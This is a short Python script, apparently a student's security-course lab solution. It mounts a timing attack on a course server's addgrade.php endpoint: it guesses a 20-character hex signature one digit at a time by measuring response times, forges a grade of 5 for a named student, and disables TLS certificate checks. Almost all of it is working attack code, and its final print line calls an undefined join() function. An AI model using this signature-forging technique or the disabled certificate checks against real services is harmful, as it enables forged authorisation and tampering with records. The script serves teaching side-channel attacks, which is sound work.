import string
import time
import urllib.request
import ssl



def buildurl(name,sige,grade):
    return "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={}&grade={}&signature={}".format(name,grade,"".join(sige))
def testSignature(url):
    urllib.request.urlopen(url, context=ctx)
    avgtime = 0
    testtime = 0
    start = time.time()
    urllib.request.urlopen(url, context=ctx)
    stop = time.time()
    avgtime = stop-start
    return avgtime

hexa = string.hexdigits[:16]
sig = list("00000000000000000000")
name = "Kalle"
grade = "5"
bestTime = 0
testTime = 0
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE #Python/min dator/manjaro gillar inte ert certifikat, kan ju lika gärna vara NSA som lyssnar nu!11!
#name = input("Name: ")
#grade = input("Grade: ")



for i in range(0, 20):
    testsig = list(sig)
    #for k in range (0,255):
    for k in hexa:

        testsig[i] = k
        url = buildurl(name,testsig,grade)
        print("HAXXXING IN PROGRESS: ", "".join(testsig),"\r",end="")
        testtime = testSignature(url)
        if bestTime < testtime:
            bestTime = testtime
            sig = list(testsig)
    bestTime = 0
print("HAXXXING COMPLETE: ",join(testsig))
print(buildurl(name,sig,grade))
